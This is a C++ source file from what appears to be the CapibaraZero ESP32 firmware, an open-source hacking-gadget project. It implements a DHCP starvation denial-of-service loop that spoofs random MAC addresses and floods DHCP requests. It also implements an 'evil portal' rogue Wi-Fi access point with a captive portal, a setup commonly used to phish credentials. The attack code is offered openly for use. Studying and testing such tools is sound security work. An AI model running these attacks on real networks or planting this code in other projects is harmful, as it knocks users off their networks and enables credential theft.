/*
 * This file is part of the Capibara zero (https://github.com/CapibaraZero/fw or
 * https://capibarazero.github.io/). Copyright (c) 2024 Andrea Canale.
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, version 3.
 *
 * This program is distributed in the hope that it will be useful, but
 * WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU
 * General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program. If not, see <http://www.gnu.org/licenses/>.
 */

#include "network_attacks.hpp"

#include <Arduino.h>
#include <ArduinoJson.h>

#include "../../include/debug.h"
#include "DHCPGlutton.hpp"
#include "posixsd.hpp"

#define MDNS_NAME "esp.lan"
#define EVIL_PORTAL_CONFIG_FILE "/captive_portal/config.json"
#define STATIC_PATH "/captive_portal"
#define DEFAULT_EVILPORTAL_AP_SSID "capibaraZero"
#define DHCP_GLUTTON_CONFIG_FILE "/dhcp_glutton/config.json"

NetworkAttacks::NetworkAttacks(/* args */) {}

NetworkAttacks::~NetworkAttacks() {}

void NetworkAttacks::connect_to_wifi() {
  File dhcp_glutton_config = open(DHCP_GLUTTON_CONFIG_FILE, "r");
  StaticJsonDocument<256> doc;
  DeserializationError error = deserializeJson(doc, dhcp_glutton_config);
  if (error) {
    LOG_ERROR("Invalid DHCP Glutton configuration");
    ESP.restart();
  }
  WiFi.mode(WIFI_STA);
  WiFi.begin((const char *)doc["ssid"], (const char *)doc["password"]);
  Serial0.println("Connecting to WiFi network");
  while (WiFi.status() != WL_CONNECTED);
  Serial0.println("Connected! Starting DoS");
}

void NetworkAttacks::create_default_ap() {
  WiFi.mode(WIFI_AP);
  WiFi.softAP(DEFAULT_EVILPORTAL_AP_SSID);
}

void NetworkAttacks::create_ap() {
  File evilportal_config = open(EVIL_PORTAL_CONFIG_FILE, "r");
  StaticJsonDocument<256> doc;
  DeserializationError error = deserializeJson(doc, evilportal_config);
  if (error) {
    LOG_ERROR(
        "Error reading captive portal config. Using default configuration");
    create_default_ap();
    return;
  }
  if (doc["ssid"].isNull() || doc["password"].isNull()) {
    LOG_ERROR("Invalid EvilPortal configuration. Using default configuration");
    create_default_ap();
    return;
  }

  WiFi.mode(WIFI_AP);
  WiFi.softAP((const char *)doc["ssid"], (const char *)doc["password"]);
}

void NetworkAttacks::dhcp_starvation() {
  connect_to_wifi();
  DHCPGlutton dhcp_dos = DHCPGlutton();
  for (;;) {
    dhcp_dos.random_mac_address_spoof();
    dhcp_dos.send_dhcp_request();
    generated_clients++;
    delay(500);  // Reduce redundant connections(Sometimes ESP get same IP due
                 // to weak random)
  }
}

void NetworkAttacks::init_evilportal() {
  create_ap();
  evilPortal = new EvilPortal(MDNS_NAME, STATIC_PATH);
}

void NetworkAttacks::start_evilportal() { evilPortal->start_portal(); }

void NetworkAttacks::kill_evilportal() {
  delete evilPortal;
  evilPortal = nullptr;
  WiFi.softAPdisconnect(true);
}